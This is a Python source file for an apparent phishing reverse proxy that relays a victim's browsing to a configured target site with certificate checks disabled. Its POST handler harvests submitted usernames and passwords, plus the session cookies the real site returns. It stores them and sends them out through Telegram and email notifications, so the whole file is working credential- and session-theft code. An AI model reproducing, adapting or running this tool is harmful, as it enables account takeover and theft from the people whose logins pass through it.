import http.server
import requests
import urllib.parse
from src.auth import capture_credentials, capture_cookies
from src.notify import send_telegram_notification, send_email_notification
from src.utils import storage, config

class ProxyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urllib.parse.urlparse(self.path)
        target_url = f"{config['target_url']}{parsed_path.path}"
        if parsed_path.query:
            target_url += f"?{parsed_path.query}"

        headers = {k: v for k, v in self.headers.items()}
        try:
            response = requests.get(target_url, headers=headers, verify=False)
            self.send_response(response.status_code)
            for key, value in response.headers.items():
                self.send_header(key, value)
            self.end_headers()
            self.wfile.write(response.content)
        except Exception as e:
            self.send_error(500, f"Proxy error: {str(e)}")

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length).decode("utf-8")
        parsed_data = urllib.parse.parse_qs(post_data)

        # Capture credentials
        username = parsed_data.get("username", [""])[0]
        password = parsed_data.get("password", [""])[0]
        if username and password:
            capture_credentials(username, password)
            send_telegram_notification(f"Captured: {username}:{password}")
            if config.get("email_notifications"):
                send_email_notification(f"Captured: {username}:{password}")

        # Capture cookies
        target_url = f"{config['target_url']}{self.path}"
        headers = {k: v for k, v in self.headers.items()}
        response = requests.post(target_url, data=post_data, headers=headers, verify=False)
        cookies = response.cookies.get_dict()
        if cookies:
            capture_cookies(cookies)
            send_telegram_notification(f"Captured cookies: {cookies}")
            if config.get("email_notifications"):
                send_email_notification(f"Captured cookies: {cookies}")

        self.send_response(response.status_code)
        for key, value in response.headers.items():
            self.send_header(key, value)
        self.end_headers()
        self.wfile.write(response.content)
